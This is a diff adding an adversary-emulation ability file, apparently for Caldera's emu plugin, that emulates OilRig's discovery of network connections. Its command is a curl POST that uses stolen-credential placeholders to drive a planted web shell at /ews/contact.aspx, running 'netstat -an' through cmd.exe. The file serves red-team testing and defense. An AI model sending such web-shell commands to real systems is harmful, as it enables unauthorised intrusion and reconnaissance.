@@ -1,0 +1,31 @@
+ability_id: 5c279562-a004-4d9c-9ec6-a7dc4997f699
+access: {}
+additional_info: {}
+buckets:
+- discovery
+delete_payload: true
+description: Attacker machine views system network connections for gosta on 10.1.0.6
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}'
+    -k -X POST --data "pro=cmd.exe" --data "cmd=netstat -an" https://#{second.target.ip}/ews/contact.aspx
+  language: null
+  name: sh
+  parsers: []
+  payloads: []
+  platform: linux
+  timeout: 60
+  uploads: []
+  variations: []
+name: OilRig View Network Connections (Kali Agent)
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: discovery
+technique_id: T1049
+technique_name: System Network Connections Discovery
